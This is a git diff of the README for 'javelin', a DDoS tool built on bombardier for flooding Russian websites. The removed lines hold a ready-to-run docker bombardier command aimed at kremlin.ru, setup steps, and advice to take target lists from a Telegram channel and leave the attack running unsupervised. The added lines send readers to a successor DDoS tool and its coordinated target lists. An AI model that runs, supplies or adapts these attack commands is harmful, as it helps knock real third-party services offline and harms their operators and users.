@@ -2,48 +2,22 @@
 
 🇺🇦 A DDoS helper tool to bring down enemy websites - based on [bombardier](https://github.com/codesenberg/bombardier) for long-term unsupervised execution 🇺🇦  
 
-### [Інструкція українською](./README_UA.md)
-### [Инструкция на русском](./README_RU.md)
+## Update
 
-### Simplified instruction - manual execution
-- Install Docker - [Instructions](https://docs.docker.com/get-docker/)
-- `docker run -it alpine/bombardier -c 1000 -d 60s -l https://kremlin.ru`
-- Last part of the comand is host url, you should pick one [from the last chat messages](https://t.me/itarmyofukraine2022)  
+It used to be a viable option, but now there's a better tool [oficially endorsed by IT Army of Ukraine](https://t.me/itarmyofukraine2022/229).  
 
-Automatic script performs the same command and loops through a list of hosts, so you can leave it unsupervised overnight or for long periods of time. It also automatically fetches updates to the list.
+Please star the repo for the [db1000n](https://github.com/Arriven/db1000n) project and follow the setup instructions:
+- [English](https://telegra.ph/Death-by-1000-needles-03-18)
+- [Українська](https://telegra.ph/Death-by-1000-needles-03-17)
 
-### Get the code
-- Clone the repo - `git clone https://github.com/v1adko/javelin.git`   
-  or  
-[download a zip](https://github.com/v1adko/javelin/archive/refs/heads/master.zip) if git clone is taking too long
-- Change working directory - `cd ./javelin`
-- Optionally update [the targets](#targets)
+The core idea of the project is the same as javelin - load generation with syncronised target coordination, but with a much better architecture and technical team.
 
-### Targets
+The target list within this repo will not be updated anymore as now this coordination is done by oficial channels and it will result in a much more effective attacks.
 
-Best update targets from [this telegram channel](https://t.me/itarmyofukraine2022)  
-Edit contents of the [./hitlist.sh](/hitlist.sh) file
+#### Below you can still find links to the old manuals for the javelin bash script
 
-### Run in Docker
+- [English manual](./README_EN.md)
+- [Інструкція українською](./README_UA.md)
+- [Инструкция на русском](./README_RU.md)
 
-*Note*: this could take quite some time, if you're tech-savvy enough,  
-try [installing binaries manually](#local) directly on your host system,  
-it should be faster
-
-- Install Docker - [Instructions](https://docs.docker.com/get-docker/)
-- Optionally update [the targets](#targets)
-- `docker-compose up --build` (on some systems compose is not installed with docker)
-   **or**
-- `docker build -t javelin .`
-- `docker run javelin`
-
-### Local
-
-- Install Go - [Instructions](https://go.dev/doc/install)
-- Install bombardier [by downloading a binary](https://github.com/codesenberg/bombardier/releases)
-- Run `./javelin-local.sh`
-
-### Run
-
-Now leave the process running for as much as you can
 Thank you for fighting on our side! 💪 🇺🇦
